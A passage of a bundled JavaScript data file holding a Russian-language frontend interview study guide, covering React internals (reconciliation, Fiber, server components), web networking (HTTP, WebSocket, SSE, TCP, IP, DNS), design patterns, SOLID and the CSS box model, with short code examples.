  <Table.Row><Table.Cell>Alice</Table.Cell></Table.Row>
</Table>
\`\`\`

**Render-props:** паттерн для переиспользования логики — компонент управляет данными/поведением, а потребитель сам решает как их рендерить.
\`\`\`jsx
// MouseTracker знает координаты, но не знает как их показать
class MouseTracker extends React.Component {
  state = { x: 0, y: 0 };
  handleMove = (e) => this.setState({ x: e.clientX, y: e.clientY });
  render() {
    return <div onMouseMove={this.handleMove}>{this.props.render(this.state)}</div>;
  }
}

// Потребитель сам решает что рендерить с этими данными:
<MouseTracker render={({ x, y }) => <p>Курсор: {x}, {y}</p>} />
<MouseTracker render={({ x, y }) => <Avatar style={{ left: x, top: y }} />} />
\`\`\`
Задача — разделить логику (что происходит) от представления (как выглядит). До хуков это был основной способ переиспользовать логику с состоянием.

Оба паттерна в основном заменены хуками (проще, без wrapper hell). Render-props → кастомный хук. Но иногда встречаются в библиотеках (react-table, Downshift).`,score:3.5},{name:"Механизм Reconciliation",level:"4",content:`**Что запускает reconciliation:**
setState, dispatch (useReducer), обновление контекста, ререндер родителя. React ставит компонент в очередь на перерендер — не выполняет сразу.

**Batching (пакетирование обновлений):**
React 18 автоматически объединяет несколько setState в один ререндер — даже внутри setTimeout, fetch, промисов:
\`\`\`js
// Один ререндер, не три:
setTimeout(() => {
  setA(1);
  setB(2);
  setC(3);
}, 1000);
\`\`\`
До React 18 batching работал только в обработчиках событий.

**Work-in-progress tree (двойная буферизация):**
React держит два дерева: текущее (current) — то что видит пользователь, и work-in-progress — то что строится. Diffing идёт между ними. Когда всё готово — деревья меняются местами атомарно. Пользователь никогда не видит незавершённое состояние.

**Почему O(n), а не O(n³):**
Наивный diff любых двух деревьев — O(n³). React использует две эвристики которые делают это O(n):
1. Элементы разного типа никогда не сравниваются — сразу снос и пересоздание
2. key — подсказка React какой элемент списка соответствует какому

**Bailout — пропуск поддерева:**
Если React при обходе видит что props и state компонента не изменились — он пропускает всё поддерево целиком, не заходя в него:
\`\`\`js
// React.memo — bailout если props не изменились (поверхностное сравнение)
const Child = React.memo(({ value }) => <div>{value}</div>);

// Нюанс: новая функция каждый ререндер = новая ссылка = memo бесполезен
<Child onClick={() => doSomething()} /> // ❌
<Child onClick={useCallback(() => doSomething(), [])} /> // ✅
\`\`\`

**Важный нюанс — ререндер ≠ обновление DOM:**
Реакт может вызвать render-функцию компонента, посчитать VDOM и решить что реальный DOM менять не нужно — изменений нет. Ререндер дорог памятью (создание VDOM), но не обязательно дорог DOM-операциями.`,score:4},{name:"Архитектура Fiber",level:"4",content:`**Проблема до Fiber (React 15 и раньше):**
Reconciliation был синхронным рекурсивным обходом стека. Начав обход — нельзя остановиться. При большом дереве JS занимал main thread на десятки миллисекунд: анимации замерзали, ввод не отвечал.

**Что такое Fiber:**
Fiber — это новый движок reconciliation (React 16+) и одновременно структура данных. Каждый компонент в дереве — это Fiber-узел:
\`\`\`js
// Упрощённо что хранит Fiber-узел:
{
  type,          // тип компонента или DOM-тег
  props,         // текущие props
  stateNode,     // DOM-узел или экземпляр класса
  memoizedState, // state хуков (связный список)
  child,         // первый дочерний Fiber
  sibling,       // следующий сосед
  return,        // родительский Fiber
  flags,         // что нужно сделать: Update | Placement | Deletion
}
\`\`\`
Вместо рекурсии — связный список. Обход можно остановить после любого узла и продолжить позже.

**Две фазы работы:**

**1. Render фаза — прерываемая:**
React обходит Fiber-дерево, вызывает render-функции, строит work-in-progress дерево, помечает узлы флагами (Update, Placement, Deletion). Эту работу можно прервать — браузер получит управление для обработки ввода или анимации — и возобновить позже.
Поскольку фаза прерываемая, тело компонента может вызваться несколько раз за одно обновление. Именно поэтому рендер должен быть чистой функцией.

**2. Commit фаза — непрерываемая:**
React берёт список изменений (effectList) и атомарно применяет к реальному DOM. Прерывать нельзя — пользователь не должен видеть промежуточное состояние.
Три подфазы commit:
• **Before mutation** — вызываются getSnapshotBeforeUpdate
• **Mutation** — применяются DOM-изменения
• **Layout** — вызывается useLayoutEffect (синхронно после DOM, до отрисовки)

После этого браузер рисует экран, затем асинхронно вызывается useEffect.

**Приоритеты и Concurrent Mode:**
Fiber позволяет назначать приоритет обновлениям. Срочное (ввод пользователя) → выполняется немедленно. Несрочное → можно отложить:
\`\`\`js
// useTransition — помечает обновление как несрочное
const [isPending, startTransition] = useTransition();
startTransition(() => setFilter(value)); // React может прервать при вводе

// useDeferredValue — дерево с этим значением рендерится с низким приоритетом
const deferred = useDeferredValue(heavyValue);
\`\`\`

**StrictMode вызывает рендер дважды** именно из-за Fiber: проверяет что компонент идемпотентен (два вызова дают одинаковый результат). В продакшне — один раз.`,score:4},{name:"Server components",level:"4",content:`**Проблема которую решают RSC:**
При SSR компонент рендерится на сервере в HTML, но его JS-код всё равно попадает в бандл — для гидратации. Тяжёлые зависимости (markdown-парсер, date библиотека) едут клиенту даже если там они не нужны.

Server Components (RSC) — компоненты которые выполняются только на сервере. Их JS в бандл не попадает вообще. Нет гидратации — нечего гидратировать.

**Как работает:**
\`\`\`jsx
// app/page.tsx — Server Component по умолчанию в Next.js App Router
export default async function Page() {
  const posts = await db.posts.findMany(); // прямой доступ к БД — без fetch!
  return <PostList posts={posts} />;
}
\`\`\`
Компонент async — можно await прямо в теле. Данные фетчатся на сервере, клиент получает готовый результат.

**Граница server/client — директива \`'use client'\`:**
\`\`\`jsx
// ❌ Без директивы — серверный, нет интерактивности
export function StaticCard({ title }) {
  return <div>{title}</div>;
}

// ✅ С директивой — клиентский, полный React
'use client';
export function LikeButton({ postId }) {
  const [liked, setLiked] = useState(false);
  return <button onClick={() => setLiked(true)}>Like</button>;
}
\`\`\`
\`'use client'\` — граница бандла. Всё что импортирует клиентский компонент тоже попадает в бандл.

**Что можно/нельзя:**
\`\`\`
Server Component:         Client Component:
✅ async/await            ✅ useState, useEffect
✅ прямой доступ к БД     ✅ обработчики событий
✅ env переменные          ✅ браузерные API
✅ fs, секретные ключи     ✅ useContext
❌ useState/useEffect      ❌ прямой доступ к БД
❌ обработчики событий     ❌ async компонент
❌ браузерные API
\`\`\`

**RSC Payload — что летит по сети:**
Сервер отдаёт не HTML, а специальный формат (JSON-подобный). Клиентские компоненты — ссылки на JS в бандле. Серверные — готовый результат рендера. React на клиенте собирает из этого дерево.

**Composition pattern — как совмещать:**
\`\`\`jsx
// Серверный компонент передаёт children клиентскому
// Важно: children рендерится на сервере, не попадает в бандл клиента
async function Page() {
  const data = await fetchData();
  return (
    <ClientShell> {/* 'use client' */}
      <ServerContent data={data} /> {/* остаётся серверным */}
    </ClientShell>
  );
}
\`\`\`

**RSC vs SSR — разница:**
SSR — рендер на сервере + гидратация на клиенте, JS едет клиенту. RSC — рендер на сервере, JS не едет, нет гидратации. Они совместимы: страница может использовать и SSR и RSC одновременно.`,score:4}]}],Af=[{id:"network",title:"СЕТЬ",icon:"🔗",color:"#66BB6A",topics:[{name:"ip-адрес и hostName",level:"1",content:`**IP-адрес** — уникальный числовой идентификатор устройства в сети.
• **IPv4:** 192.168.1.1 (4 октета, 32 бита, ~4.3 млрд адресов)
• **IPv6:** 2001:0db8::1 (128 бит, практически неограничено)

**Hostname** — человекочитаемое имя (example.com), преобразуется в IP через DNS.

**localhost** = 127.0.0.1 (loopback). **0.0.0.0** — все интерфейсы.

**Порт** — логический адрес приложения на устройстве (80 — HTTP, 443 — HTTPS, 3000 — dev).`},{name:"Базовое понимание различий POST и GET",level:"2",content:`**GET:**
• Параметры в URL (query string)
• Кэшируется браузером
• Ограничение длины URL (~2048 символов)
• Идемпотентный (повторный запрос = тот же результат)
• Для получения данных

**POST:**
• Данные в теле запроса (body)
• НЕ кэшируется по умолчанию
• Нет ограничения размера тела
• НЕ идемпотентный
• Для создания/изменения данных

**Другие методы:** PUT (полная замена), PATCH (частичное обновление), DELETE (удаление), HEAD (только заголовки), OPTIONS (CORS preflight).`},{name:"Query-параметры",level:"2",content:"Параметры в URL после `?`, разделённые `&`:\n```\nhttps://api.com/users?page=1&limit=10&sort=name\n```\n\n**URLSearchParams API:**\n```js\nconst params = new URLSearchParams('page=1&limit=10');\nparams.get('page');      // '1'\nparams.set('page', '2');\nparams.append('filter', 'active');\nparams.toString();       // 'page=2&limit=10&filter=active'\n```\n\n**Кодирование:** спецсимволы → encodeURIComponent() / decodeURIComponent()."},{name:"REST API",level:"2",content:`**REST** — архитектурный стиль для API.

**Принципы:**
• Ресурсы идентифицируются URL: \`/users\`, \`/users/1\`
• HTTP-методы как операции: GET (read), POST (create), PUT/PATCH (update), DELETE
• **Stateless** — каждый запрос содержит всю необходимую информацию. Сервер не помнит предыдущие запросы.
• Единый интерфейс

**Stateless на примере:**
\`\`\`
// Не REST (с состоянием):
Запрос 1: "залогинься как user123"
Запрос 2: "дай мне мои заказы"  // сервер помнит кто ты

// REST (stateless):
Запрос 1: "залогинься как user123" → получаешь токен
Запрос 2: "дай заказы, вот мой токен: Bearer xxx"
\`\`\`

Преимущества stateless: масштабируемость (любой сервер обработает запрос), простота (не нужно хранить сессии), надёжность (упавший сервер не теряет состояние клиентов).

Именно поэтому JWT популярен в REST — клиент сам хранит токен и передаёт в каждом запросе.

**Хорошие практики:**
\`\`\`
GET    /users       → список пользователей
GET    /users/1     → конкретный пользователь
POST   /users       → создать пользователя
PUT    /users/1     → обновить полностью
PATCH  /users/1     → обновить частично
DELETE /users/1     → удалить
\`\`\`

**Коды ответов:** 200 OK, 201 Created, 204 No Content, 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found, 500 Internal Server Error.`},{name:"Понимание протокола HTTP",level:"2",content:`**HTTP (HyperText Transfer Protocol)** — протокол запрос-ответ.

**Запрос:**
\`\`\`
GET /index.html HTTP/1.1
Host: example.com
Accept: text/html
Cookie: session=abc
\`\`\`

**Ответ:**
\`\`\`
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: session=abc
Cache-Control: max-age=3600
\`\`\`

**HTTPS** — HTTP + TLS шифрование. TLS (Transport Layer Security) — протокол, который:
• Шифрует данные — перехваченный трафик нечитаем
• Аутентифицирует сервер — SSL-сертификат подтверждает что это действительно тот сервер
• Обеспечивает целостность — данные не изменены в пути

Как работает: клиент и сервер проводят TLS Handshake — договариваются об алгоритмах, обмениваются сертификатом, генерируют общий симметричный ключ. Дальше всё шифруется этим ключом.

**Коды ответов:**
• **1xx** — информационные (101 Switching Protocols — WebSocket)
• **2xx** — успех (200 OK, 201 Created, 204 No Content)
• **3xx** — редиректы (301 Moved Permanently, 302 Found, 304 Not Modified)
• **4xx** — ошибка клиента (400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found)
• **5xx** — ошибка сервера (500 Internal Server Error, 503 Service Unavailable)

**Заголовки:**

**Content-Type** — формат тела запроса/ответа:
\`\`\`
application/json                — JSON
text/html; charset=utf-8        — HTML
text/plain                      — обычный текст
multipart/form-data             — загрузка файлов
application/x-www-form-urlencoded — данные формы
\`\`\`

**Authorization** — передача токена:
\`\`\`
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
Authorization: Basic dXNlcjpwYXNz  // base64(login:password)
\`\`\`

**Cache-Control** — управление кэшем:
\`\`\`
no-cache       // всегда проверять актуальность
no-store       // не кэшировать вообще
max-age=3600   // кэшировать 1 час
public         // можно кэшировать везде (CDN + браузер)
private        // только браузер, не CDN
\`\`\`

**Accept** — ожидаемый формат ответа:
\`\`\`
Accept: application/json
Accept: text/html
\`\`\`

**CORS** — управление доступом между доменами:
\`\`\`
// Ответ сервера:
Access-Control-Allow-Origin: https://mysite.com
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: Authorization
Access-Control-Allow-Credentials: true

// Preflight-запрос браузера:
Origin: https://mysite.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization
\`\`\`

**Set-Cookie / Cookie:**
\`\`\`
// Сервер устанавливает:
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict

// Браузер отправляет:
Cookie: session=abc123
\`\`\`

**Прочие важные:**
\`\`\`
Content-Length: 348           // размер тела в байтах
Host: api.example.com         // хост назначения
User-Agent: Mozilla/5.0...    // браузер/клиент
Referer: https://site.com     // откуда пришёл запрос
Location: /new-url            // куда редиректить (3xx)
\`\`\`

**HTTP/3:**
• Основан на **QUIC** (поверх UDP вместо TCP)
• Встроенное шифрование TLS 1.3 прямо в QUIC
• Нет head-of-line блокировки на транспортном уровне (в HTTP/2 один потерянный TCP-пакет блокирует все потоки одного соединения)
• **0-RTT** для повторных подключений — быстрее установление соединения
• **Connection migration** — соединение выживает при смене IP (переход Wi-Fi ↔ LTE, критично для мобильных)
• Поддерживается Cloudflare, Google, Fastly`},{name:"Понимание протокола HTTP/2",level:"3",content:`**Главная проблема HTTP/1.1** — один запрос на одно соединение (или очередь). Браузер открывал до 6 параллельных соединений на домен — это лимит.

**HTTP/2 решает это через:**

**1. Мультиплексирование** — несколько запросов через одно соединение параллельно:
\`\`\`
HTTP/1.1: [запрос1] → [ответ1] → [запрос2] → [ответ2]  // очередь
HTTP/2:   [запрос1] ↘
          [запрос2] → [ответ1][ответ2][ответ3]  // параллельно, одно соединение
          [запрос3] ↗
\`\`\`

**2. Сжатие заголовков (HPACK)** — в HTTP/1.1 заголовки передаются как текст при каждом запросе. HTTP/2 сжимает и кэширует — повторяющиеся не передаются.

**3. Server Push** — сервер сам отправляет ресурсы которые понадобятся клиенту:
\`\`\`
Клиент запросил index.html →
Сервер отправляет: index.html + style.css + app.js
// Не ждёт пока браузер разберёт HTML и запросит их
\`\`\`

**4. Бинарный протокол** — HTTP/1.1 текстовый, HTTP/2 бинарный → быстрее парсится, меньше ошибок.

**5. Приоритизация** — можно указать какие запросы важнее (CSS важнее картинок).

**Главный выигрыш — мультиплексирование.** Именно из-за него не нужны старые оптимизации HTTP/1.1: спрайты, domain sharding, конкатенация файлов.`},{name:"Различие Long-Polling, Websockets, Server-Sent Events",level:"3",content:`**Проблема:** HTTP — запрос/ответ. Сервер не может сам инициировать отправку данных клиенту. Нужны специальные техники для realtime.

---

**Long Polling**
Клиент отправляет запрос → сервер держит соединение открытым пока нет данных → появились данные, сервер отвечает → клиент сразу шлёт новый запрос.
\`\`\`js
async function longPoll() {
  const response = await fetch('/api/events');
  const data = await response.json();
  processData(data);
  longPoll(); // сразу новый запрос
}
\`\`\`
Минусы: новое HTTP-соединение каждый раз, задержки, неэффективно при высокой нагрузке.
Когда: простые случаи, старые браузеры, редкие обновления.

---

**WebSocket**
Полнодуплексное постоянное соединение. Клиент и сервер отправляют данные в любой момент.

Handshake — клиент отправляет HTTP-запрос с заголовком Upgrade:
\`\`\`
GET /chat HTTP/1.1
Upgrade: websocket       ← хочу переключиться на WebSocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZQ==

→ HTTP/1.1 101 Switching Protocols  ← сервер согласен
\`\`\`
После этого то же TCP-соединение используется уже для WebSocket, не HTTP.
\`\`\`js
const ws = new WebSocket('wss://site.com/chat');

ws.onopen = () => ws.send(JSON.stringify({ type: 'message', text: 'hello' }));
ws.onmessage = (e) => console.log(JSON.parse(e.data));
ws.onerror = (e) => console.error(e);
ws.onclose = (e) => console.log('закрыто', e.code);

ws.close(1000, 'работа завершена');
\`\`\`

Коды закрытия: 1000 — норма, 1001 — страница закрыта, 1006 — обрыв сети, 1011 — ошибка сервера.

Reconnect — вручную:
\`\`\`js
function connect() {
  const ws = new WebSocket('wss://site.com');
  ws.onclose = () => setTimeout(connect, 1000);
}
\`\`\`
Когда: чат, игры, реалтайм коллаборация, трейдинг.

---

**SSE (Server-Sent Events)**
Одностороннее соединение сервер → клиент. Обычный HTTP с Content-Type: text/event-stream. Автоматический reconnect встроен в браузер.
\`\`\`js
// Клиент:
const es = new EventSource('/stream');
es.onmessage = (e) => console.log(e.data);
es.addEventListener('update', (e) => console.log(e.data));
es.close();
\`\`\`
\`\`\`js
// Сервер (Node.js):
res.setHeader('Content-Type', 'text/event-stream');
res.setHeader('Cache-Control', 'no-cache');

res.write('data: привет\\n\\n');              // простое сообщение
res.write('event: update\\n');               // именованное событие
res.write('data: {"price": 100}\\n\\n');
res.write('id: 42\\n');                      // ID для reconnect
res.write('data: сообщение\\n\\n');
res.write('retry: 3000\\n\\n');              // задержка reconnect (мс)
\`\`\`
При обрыве браузер переподключается сам и отправляет Last-Event-ID — сервер знает с какого события продолжать.
Когда: лента новостей, уведомления, прогресс операции, live логи.

---

**Сравнение:**

**Long Polling** — HTTP, двустороннее, новое соединение каждый раз, reconnect вручную, простой.
**WebSocket** — WS/WSS, двустороннее, постоянное соединение, reconnect вручную, средний.
**SSE** — HTTP, только сервер→клиент, постоянное соединение, reconnect автоматически, простой.`},{name:"Базовое понимание TCP",level:"4",content:`**TCP (Transmission Control Protocol)** — протокол транспортного уровня. Обеспечивает надёжную доставку данных между двумя точками.
Интернет передаёт данные пакетами — они могут потеряться, прийти не в том порядке, задублироваться. TCP решает все эти проблемы.

**Модель OSI (упрощённо):**
\`\`\`
Приложение: HTTP, WebSocket, FTP, DNS
Транспорт:  TCP, UDP
Сеть:       IP
Канал:      Ethernet, WiFi
Физический: провода, радиоволны
\`\`\`
Каждый уровень использует нижний как транспорт. HTTP работает поверх TCP, TCP работает поверх IP.

**3-way handshake — установка соединения:**
\`\`\`
Клиент → Сервер:  SYN          (хочу соединиться, мой seq=100)
Сервер → Клиент:  SYN + ACK    (согласен, мой seq=200, подтверждаю твой 101)
Клиент → Сервер:  ACK          (принял, подтверждаю твой 201)
\`\`\`
После этого соединение установлено. Это причина задержки HTTP/1.1 — каждое новое соединение требует handshake.

**Закрытие — 4-way handshake:**
\`\`\`
Клиент → Сервер:  FIN    (я закончил отправку)
Сервер → Клиент:  ACK    (принял)
Сервер → Клиент:  FIN    (я тоже закончил)
Клиент → Сервер:  ACK    (принял, соединение закрыто)
\`\`\`

**Главные характеристики:**
• **Надёжность** — каждый пакет подтверждается через ACK. Нет подтверждения → повтор отправки.
• **Порядок** — каждый пакет имеет sequence number. Получатель собирает пакеты в правильном порядке даже если пришли вразнобой.
• **Flow Control** — получатель сообщает сколько данных готов принять (window size). Отправитель не перегружает получателя.
• **Congestion Control** — TCP снижает скорость если сеть перегружена.

**TCP vs UDP:**
**TCP** — гарантирует доставку, сохраняет порядок, медленнее, 3-way handshake, высокий overhead.
**UDP** — без гарантий, порядок не гарантирован, быстрее, нет handshake, минимальный overhead.

TCP используют: HTTP, HTTPS, WebSocket, FTP, SSH.
UDP используют: видеозвонки (WebRTC, Zoom), онлайн игры, DNS, стриминг, HTTP/3 (QUIC).

**Почему UDP для видео/игр:**
Потеря пакета в TCP → повтор → задержка. В видеозвонке лучше пропустить кадр чем ждать повтора — это создаёт заморозку. UDP просто отбрасывает потерянный пакет и продолжает.

**HTTP/3 и QUIC:**
HTTP/3 работает поверх QUIC — протокол на базе UDP но с надёжностью на уровне приложения: нет 3-way handshake, мультиплексирование без head-of-line blocking, встроенное шифрование TLS 1.3.

**Keep-Alive:**
HTTP/1.1 по умолчанию держит TCP-соединение открытым для нескольких запросов (Connection: keep-alive). Без этого каждый запрос = новый TCP handshake. HTTP/2 идёт дальше — одно соединение для всех запросов.`},{name:"Базовое понимание IP",level:"4",content:`**IP (Internet Protocol)** — протокол сетевого уровня. Отвечает за адресацию и маршрутизацию пакетов между сетями.

TCP разбивает данные на пакеты. IP доставляет каждый пакет от отправителя к получателю через цепочку роутеров. IP не гарантирует доставку — это задача TCP.

**Структура IP-пакета:**
\`\`\`
Заголовок:
  Source IP      — откуда пакет
  Destination IP — куда пакет
  TTL            — время жизни пакета
  Protocol       — что внутри (TCP=6, UDP=17)
  Checksum       — проверка целостности заголовка
Данные (payload) — TCP сегмент внутри
\`\`\`

**TTL (Time To Live):**
Каждый пакет имеет счётчик TTL (обычно 64 или 128). Каждый роутер уменьшает TTL на 1. TTL = 0 → пакет уничтожается → отправителю приходит ICMP "Time Exceeded".
Зачем: предотвращает бесконечную циркуляцию потерявшихся пакетов.
\`\`\`bash
traceroute google.com
# Отправляет пакеты с TTL=1, TTL=2, TTL=3...
# Каждый роутер отвечает — видим весь маршрут
\`\`\`

**Маршрутизация:**
\`\`\`
Твой компьютер → Домашний роутер → Роутер провайдера → ... → Сервер
\`\`\`
Каждый роутер смотрит на Destination IP и решает куда передать дальше по таблице маршрутизации. IP не знает весь путь заранее — каждый роутер решает локально.

**IPv4 vs IPv6:**
• **IPv4** — 32 бита (192.168.1.1), ~4 млрд адресов, закончились, решение: NAT
• **IPv6** — 128 бит (2001:0db8::8a2e:0370:7334), 340 ундециллионов адресов, встроенный IPSec, нет NAT

**NAT (Network Address Translation):**
Из-за нехватки IPv4 адресов несколько устройств домашней сети выходят в интернет через один публичный IP:
\`\`\`
192.168.1.2 (телефон)   ┐
192.168.1.3 (ноутбук)   ├─→ Роутер (NAT) → 85.142.10.5 (один публичный IP)
192.168.1.4 (телевизор) ┘
\`\`\`
Приватные диапазоны (не маршрутизируются в интернете):
\`\`\`
10.0.0.0/8       — большие сети
172.16.0.0/12    — средние сети
192.168.0.0/16   — домашние сети
127.0.0.0/8      — loopback (localhost)
\`\`\`

**ICMP — служебные сообщения:**
\`\`\`bash
ping google.com       # проверить доступность хоста
traceroute google.com # показать маршрут пакета
\`\`\`
Также ICMP сообщает: "Destination Unreachable" (хост недоступен), "Time Exceeded" (TTL истёк).`},{name:"Базовое понимание DNS",level:"4",content:`**DNS (Domain Name System)** — преобразует доменное имя в IP-адрес.

**Как браузер резолвит домен:**
1. Браузер проверяет свой кэш
2. ОС проверяет файл hosts (/etc/hosts)
3. Запрос к DNS резолверу провайдера
4. Резолвер проверяет свой кэш
5. Если нет — рекурсивный запрос по иерархии

**Иерархия DNS:**
\`\`\`
Root DNS серверы (.)
    ↓
TLD серверы (.com, .ru, .org)
    ↓
Authoritative серверы (google.com)
    ↓
Ответ: 142.250.185.46
\`\`\`
• **Root серверы** — знают где TLD серверы. Их всего 13 кластеров в мире.
• **TLD серверы** — знают где authoritative серверы для каждого домена.
• **Authoritative серверы** — хранят реальные DNS записи домена.

**DNS записи:**
• **A** — домен → IPv4: google.com → 142.250.185.46
• **AAAA** — домен → IPv6
• **CNAME** — псевдоним: www.google.com → google.com
• **MX** — почтовый сервер домена
• **TXT** — текстовые данные (верификация, SPF)
• **NS** — какие серверы отвечают за домен

**TTL в DNS:**
Каждая запись имеет TTL — сколько секунд её кэшировать. При смене IP нужно ждать пока TTL истечёт у всех кэшей. Поэтому при переезде сайта ставят низкий TTL заранее.

**Файл hosts:**
До DNS-запроса ОС проверяет локальный файл — используется для локальной разработки и блокировки сайтов.
\`\`\`
# /etc/hosts (Linux/Mac)
127.0.0.1       localhost
192.168.1.10    mydevserver.local
\`\`\`

**DNS over HTTPS (DoH):**
Обычный DNS — незашифрованный UDP порт 53, провайдер видит все запросы. DoH — DNS через HTTPS, зашифрован. Используют Cloudflare (1.1.1.1), Google (8.8.8.8).`}]},{id:"patterns",title:"ПАТТЕРНЫ",icon:"🧩",color:"#AB47BC",topics:[{name:"DRY, KISS, YAGNI",level:"2",content:`**DRY (Don't Repeat Yourself):** каждая часть знания имеет единственное представление. Дублирование → вынести в функцию/модуль. Но: не путай совпадение кода с дублированием логики.

**KISS (Keep It Simple, Stupid):** простое решение лучше сложного. Не усложняй без необходимости. Читаемость > краткость.

**YAGNI (You Aren't Gonna Need It):** не реализуй функционал «на будущее». Делай только то, что нужно сейчас. Преждевременная абстракция — зло.`},{name:"Навык использования и определения паттерна в коде: Observer",level:"3",content:`**Observer (Наблюдатель)** — объект уведомляет подписчиков о своих изменениях.

\`\`\`js
class EventEmitter {
  constructor() { this.listeners = {}; }
  on(event, fn) {
    (this.listeners[event] ||= []).push(fn);
  }
  off(event, fn) {
    this.listeners[event] = this.listeners[event]?.filter(f => f !== fn);
  }
  emit(event, data) {
    this.listeners[event]?.forEach(fn => fn(data));
  }
}
\`\`\`

**Где в JS:** addEventListener, RxJS, EventEmitter в Node.js, Redux store.subscribe(), Vue reactivity.`},{name:"Factory Method, Prototype, Proxy, Singleton",level:"3",content:`**Factory Method** — функция, создающая объекты без new:
\`\`\`js
function createUser(type) {
  if (type === 'admin') return new Admin();
  return new User();
}
\`\`\`

**Prototype** — создание через клонирование существующего объекта:
\`\`\`js
const proto = { greet() { return 'hi'; } };
const obj = Object.create(proto);
\`\`\`

**Proxy** — обёртка, перехватывающая операции (мы подробно разобрали в JS).

**Singleton** — один экземпляр на всё приложение:
\`\`\`js
class DB {
  static instance;
  static getInstance() {
    if (!DB.instance) DB.instance = new DB();
    return DB.instance;
  }
}
\`\`\`
В JS модули — уже singleton (экспорт кэшируется).

**Strategy** — семейство алгоритмов, взаимозаменяемых без изменения клиента:
\`\`\`js
class Sorter {
  constructor(strategy) { this.strategy = strategy; }
  sort(data) { return this.strategy(data); }
}
const quickSort = data => [...data].sort(); // упрощённо
const bubbleSort = data => { /* другой алгоритм */ };

const sorter = new Sorter(quickSort);
sorter.strategy = bubbleSort; // поменяли алгоритм без изменения Sorter
\`\`\`
Где встречается: axios interceptors, разные алгоритмы валидации, стратегии кэширования в SW.

**Command** — инкапсулирует действие как объект (поддерживает undo, очередь, логирование):
\`\`\`js
const commands = [];
const execute = (cmd) => { cmd.execute(); commands.push(cmd); };
const undo = () => commands.pop()?.undo();

execute({ execute: () => editor.insert('hello'), undo: () => editor.delete(5) });
\`\`\`
Где встречается: история операций в редакторах, Redux actions (каждый action — команда).`},{name:"Навык использования и определения паттерна в коде: Decorator",level:"3",content:`**Decorator** — оборачивает объект/функцию, добавляя поведение без изменения оригинала.

\`\`\`js
function withLogging(fn) {
  return function(...args) {
    console.log('Calling', fn.name, args);
    const result = fn.apply(this, args);
    console.log('Result:', result);
    return result;
  };
}

const add = (a, b) => a + b;
const loggedAdd = withLogging(add);
loggedAdd(2, 3); // Calling add [2,3] → Result: 5
\`\`\`

**TC39 Decorators (Stage 3):**
\`\`\`js
@logged
class MyClass { ... }
\`\`\`

**Где:** HOC в React, middleware в Express/Redux, TypeORM entity decorators.`},{name:"Навык использования и определения паттерна в коде: Dependency Injection",level:"4",content:`**DI** — зависимости передаются извне, а не создаются внутри.

\`\`\`js
// Без DI — жёсткая связь
class UserService {
  constructor() {
    this.db = new PostgresDB(); // привязан к PostgresDB
  }
}

// С DI — гибкая связь
class UserService {
  constructor(db) { // получает снаружи
    this.db = db;
  }
}
new UserService(new PostgresDB());
new UserService(new MockDB()); // для тестов!
\`\`\`

**Преимущества:** тестируемость (моки), гибкость, слабая связанность.

**Где в React:** Context как DI-контейнер, передача зависимостей через props, кастомные хуки.`}]},{id:"dev",title:"РАЗРАБОТКА ПО",icon:"⚙️",color:"#78909C",topics:[{name:"Функциональное программирование, его отличие от ООП",level:"2",content:`**ФП:**
• Данные неизменяемы (immutability)
• Чистые функции (нет побочных эффектов)
• Функции — first-class citizens
• Композиция функций
• Декларативный стиль

**ООП:**
• Данные + поведение в объектах
• Инкапсуляция, наследование, полиморфизм
• Изменяемое состояние
• Императивный стиль

**В JS используются оба:** React (ФП — компоненты как чистые функции, иммутабельный state) + классы, наследование.

**Currying** — преобразование функции с N аргументами в цепочку функций с одним:
\`\`\`js
const add = a => b => a + b;
const add5 = add(5);
add5(3); // 8 — частичное применение

// Практика: предконфигурация
const fetchWith = baseUrl => endpoint => fetch(baseUrl + endpoint);
const api = fetchWith('https://api.example.com');
api('/users'); // настроен один раз, переиспользуется
\`\`\`

**Pipe / Compose** — объединение функций в цепочку (data pipeline):
\`\`\`js
const pipe = (...fns) => x => fns.reduce((v, f) => f(v), x);
const compose = (...fns) => x => fns.reduceRight((v, f) => f(v), x);

const transform = pipe(
  str => str.trim(),
  str => str.toLowerCase(),
  str => str.replace(/s+/g, '-')
);
transform('  Hello World '); // 'hello-world'
\`\`\`

**Иммутабельность:** никогда не мутируй — возвращай новый объект/массив:
\`\`\`js
// ❌ мутация
state.count++;
arr.push(item);
// ✅ иммутабельно
{ ...state, count: state.count + 1 }
[...arr, item]
\`\`\`
Именно поэтому React не видит изменения при мутации state — ссылка та же.`},{name:"SOLID, Cohesion и Coupling",level:"3",content:`**S** — Single Responsibility: класс/модуль — одна ответственность
**O** — Open/Closed: открыт для расширения, закрыт для изменения
**L** — Liskov Substitution: подклассы заменяют родителей без поломок
**I** — Interface Segregation: много специфичных интерфейсов лучше одного общего
**D** — Dependency Inversion: зависеть от абстракций, не от деталей

**Cohesion (связность):** насколько элементы модуля связаны по смыслу. Высокая — хорошо.
**Coupling (связанность):** насколько модули зависят друг от друга. Низкая — хорошо.

**Цель:** High Cohesion + Low Coupling.`},{name:"MVC, MVVM",level:"4",content:`**MVC (Model-View-Controller):**
• **Model** — данные и бизнес-логика
• **View** — отображение (UI)
• **Controller** — обрабатывает ввод, обновляет Model и View

**MVVM (Model-View-ViewModel):**
• **Model** — данные
• **View** — UI (декларативный)
• **ViewModel** — состояние View + логика. Двустороннее связывание (data binding)

**В React:** ближе к однонаправленному потоку. Component = View + часть ViewModel. State/Redux = Model. Не чистый MVC/MVVM.

**В Vue:** ближе к MVVM (реактивное двустороннее связывание через v-model).`}]},{id:"css",title:"ВЁРСТКА",icon:"🎨",color:"#E44D26",topics:[{name:"Блочная модель",level:"1",content:`Content → Padding → Border → Margin

**content-box** (по умолчанию): width = только content. Padding + border добавляются сверху.
**border-box**: width = content + padding + border. Margin НЕ входит.

\`\`\`css
*, *::before, *::after { box-sizing: border-box; }
\`\`\`

**Margin collapsing:**
Вертикальные margins соседних блочных элементов схлопываются — берётся **больший**:
\`\`\`css
.a { margin-bottom: 20px; }
.b { margin-top: 30px; }
/* расстояние между ними = 30px, не 50px */
\`\`\`

**3 случая коллапса:**
1. Соседние siblings (братья)
